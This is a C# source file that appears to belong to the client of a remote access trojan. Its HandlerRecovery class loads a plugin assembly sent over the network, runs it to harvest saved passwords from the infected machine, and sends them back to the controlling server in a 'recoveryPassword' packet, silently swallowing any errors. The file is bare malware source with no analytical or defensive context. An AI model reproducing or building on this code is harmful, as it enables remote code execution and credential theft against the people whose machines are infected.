using Client.MessagePack;
using Client.Sockets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Diagnostics;
namespace Client.Handle_Packet
{
   public class HandlerRecovery
    {
        public HandlerRecovery(MsgPack unpack_msgpack)
        {
            try
            {
                Assembly loader = Assembly.Load(unpack_msgpack.ForcePathObject("Plugin").GetAsBytes());
                MethodInfo meth = loader.GetType("Plugin.Plugin").GetMethod("Plg");
                object InjObj = loader.CreateInstance(meth.Name);
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
                msgpack.ForcePathObject("Password").AsString = (string)meth.Invoke(InjObj, null);
                ClientSocket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
            return;
        }
    }
}
